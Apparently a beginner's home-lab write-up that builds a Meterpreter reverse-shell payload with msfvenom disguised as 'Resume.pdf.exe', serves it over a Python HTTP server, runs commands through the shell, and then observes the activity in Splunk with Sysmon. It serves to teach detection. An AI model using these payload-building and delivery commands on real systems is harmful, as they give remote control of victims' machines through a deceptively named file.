![[Pasted image 20250427000420.png]]
Before we start using NMAP on the windows device, make sure that you enable this setting on your target device.
Not shown: 1000 filtered tcp ports (no-response)
The above message will appear if you do not enable it.

## ATTACKER 
#### MSFVenom
We'll be using this tool to create the malware.

#### Using a meterpreter reverse shell as a payload by getting the list of payloads
```
msfvenom -l payloads
```

#### Create the Payload
```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe
```

This command will generate a malware using the payload and will connect back to the machine base on the lhost and lport with the file format being .exe.

#### Opening up a handler to listen in the port that we configured on our malware

```
msfconsole
use exploit/multi/handler --now in the exploit itself
options --see what we can configure
set payload windows/x64/meterpreter/reverse_tcp --change the payload to the same one we use
set lhost 192.168.20.11 --change lhost to our attacker machine(kali)
options 
exploit --start the handler 
```

Now, we are listening in and waiting for the target machine to execute the malware that has been created.

#### Set up a HTTP server 
This is so that the target machine can download the malware that we created. You can create it either using python or startup an apache service.

```
python3 -m http.server 9999
```

## TARGET
Before we start, make sure to turn off real time protection.

#### Download the Malware
Enter the ip address of the attacker machine along with the port used for the http server and download it from there.

#### Execute and verify the malware connection
Press the file that has been download and go into terminal and type in the command `netstat -anob.

## Splunk Time!
After the attacker has gained the access to the target device now you can head into their shell and execute commands.
#### Enter some commands in kali
```
shell
net user
net localgroup
ipconfig
```

#### Setting up Splunk

Before you start, you need internet access to download a Sysmon app from the Splunk apps which would require you to change your network adapter to NAT. After the download, you can switch back to Internal Network and continue with the query.

![[Pasted image 20250427000456.png]]
This is what we'd like to see. You'd need knowledge regarding event ids, guids and more to get a better understanding at what you're trying to query.

From the output above, we see that whatever command that was executed by the attacker was recorded.

##### TROUBLESHOOTING

There was a problem I encountered during in Splunk and it was that when I searched "index = endpoint", nothing came up. I recorded the solution down below for anyone's reference.

1. Check if you have the inputs.conf file in the Splunk directory.
2. Sometimes the inputs.conf file might be empty so make sure before doing the search in Splunk, check and see if the contents are in there.
3. After pasting the inputs.conf file in the directory, restart your Splunk service and in my case, my device has a problem with restarting that particular service so I just stop and start the service instead of clicking restart.
4. Don't forget to create an index in the Settings in Splunk.

## Conclusion

All in all, creating a Home Lab was a very good experience is something Cybersecurity aspiring people should have if they want to persue . I realized that you do need some Networking knowledge beforehand but even as a beginner, this project helps create a strong foundation in both your networking and cybersecurity skills. This project looked simple at first but it had it difficulties in some places thus requires your troubleshooting skills. Overall, it was a fun mini project for me and a valuable experience. 